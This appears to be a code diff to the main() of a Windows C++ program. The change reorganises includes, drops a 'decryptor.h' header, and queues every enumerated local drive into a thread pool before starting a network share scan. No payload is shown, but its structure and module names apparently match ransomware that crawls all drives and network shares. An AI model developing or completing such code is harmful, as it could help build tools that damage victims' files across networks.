@@ -1,10 +1,10 @@
 #include "common.h"
-#include "filesystem.h"
-#include "network_scanner.h"
-#include "threadpool.h"
+#include "filesystem/filesystem.h"
+//#include "network_scanner.h"
+#include "threadpool/threadpool.h"
 #include <Shlwapi.h>
-#include "global_parameters.h"
-#include "decryptor.h"
+#include "global/global_parameters.h"
+#include "network_scanner/network_scanner.h"
 
 #pragma comment(lib, "Shell32.lib")
 
@@ -34,10 +34,10 @@ int main()
 {
 	HANDLE hLocalSearch = NULL;
 	filesystem::DRIVE_LIST DriveList;
-	network_scanner::SHARE_LIST ShareList;
+	//network_scanner::SHARE_LIST ShareList;
 
 	TAILQ_INIT(&DriveList);
-	TAILQ_INIT(&ShareList);
+	//TAILQ_INIT(&ShareList);
 
 	SYSTEM_INFO SysInfo;
 	GetNativeSystemInfo(&SysInfo);
@@ -61,24 +61,16 @@ int main()
 		return EXIT_FAILURE;
 	}
 
-	//filesystem::SearchFiles(L"C:\\users\\toha\\Desktop\\test", threadpool::LOCAL_THREADPOOL);
-
 	if (filesystem::EnumirateDrives(&DriveList)) {
-		hLocalSearch = CreateThread(NULL, 0, filesystem::StartLocalSearch, &DriveList, 0, NULL);
-	}
 
-	PSTRING String = NULL;
-	TAILQ_FOREACH(String, &g_HostList, Entries) {
-		network_scanner::EnumShares(String->wszString, &ShareList);
-	}
+		filesystem::PDRIVE_INFO DriveInfo = NULL;
+		TAILQ_FOREACH(DriveInfo, &DriveList, Entries) {
+			threadpool::PutTask(threadpool::LOCAL_THREADPOOL, DriveInfo->RootPath);
+		}
 
-	network_scanner::PSHARE_INFO ShareInfo = NULL;
-	TAILQ_FOREACH(ShareInfo, &ShareList, Entries) {
-		filesystem::SearchFiles(ShareInfo->wszSharePath, threadpool::NETWORK_THREADPOOL);
 	}
 
 	network_scanner::StartScan();
-	WaitForSingleObject(hLocalSearch, INFINITE);
 	threadpool::Wait(threadpool::LOCAL_THREADPOOL);
 	threadpool::Wait(threadpool::NETWORK_THREADPOOL);
 	return EXIT_SUCCESS;
